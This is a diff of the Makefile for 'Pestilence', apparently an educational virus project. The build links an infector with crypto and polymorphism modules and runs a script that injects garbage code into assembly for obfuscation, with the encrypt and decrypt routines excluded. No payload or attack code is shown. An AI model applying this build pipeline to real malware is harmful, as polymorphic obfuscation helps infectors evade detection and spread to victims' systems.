@@ -3,7 +3,7 @@ NAME=Pestilence
 DEBUG=0
 DEBUG_EXT=0
 FLAGS_IGNORE_WARNINGS=-Wno-unused-value -Wno-unused-variable -Wno-unused-parameter
-FLAGS = -MD -fno-stack-protector -fPIC -fPIE -Wextra -Wall -O3 -fno-tree-loop-distribute-patterns -D DEBUG=$(DEBUG) -D DEBUG_EXT=$(DEBUG_EXT) $(FLAGS_IGNORE_WARNINGS)
+FLAGS = -MD -fno-stack-protector -fPIC -fPIE -Wextra -Wall -fno-tree-loop-distribute-patterns -D DEBUG=$(DEBUG) -D DEBUG_EXT=$(DEBUG_EXT) $(FLAGS_IGNORE_WARNINGS)
 
 SRC_DIR				= .
 TMP_DIR				= .tmp
@@ -37,7 +37,7 @@ OBJ_NO_TABLE=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(
 OBJ =		$(OBJ_NO_TABLE) \
 		$(addprefix $(OBJ_DIR)/, $(patsubst %.c,%.o,$(TABLE_C)))
 
-SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO)
+SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(POLY)
 
 OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(SRC_INF_C))))
 
@@ -81,7 +81,7 @@ $(OBJ_DIR)/table.o: $(TABLE_C) | $(OBJ_DIR)
 GARBAGE_CF = $(TMP_DIR)/garbage.txt
 
 fn_list: $(VIRUS)
-	nm --defined-only -n .tmp/virus.template | grep -v '\.' | cut -d ' ' -f 3 | sed -e '/^cmpr_start$$/,$$d' | sort > fn_list
+	nm --defined-only -n .tmp/virus.template | grep -v '\.' | cut -d ' ' -f 3 | sed -e '/^cmpr_start$$/,$$d' | grep -v DECRYPT_ROUTINE | grep -v ENCRYPT_ROUTINE | sort > fn_list
 
 $(OBJ_DIR)/%.s: $(OBJ_DIR)/%.gs
 	./others/scripts/add_garbage $< -p 200 -l toto $(shell cat fn_list) || cp $< $@
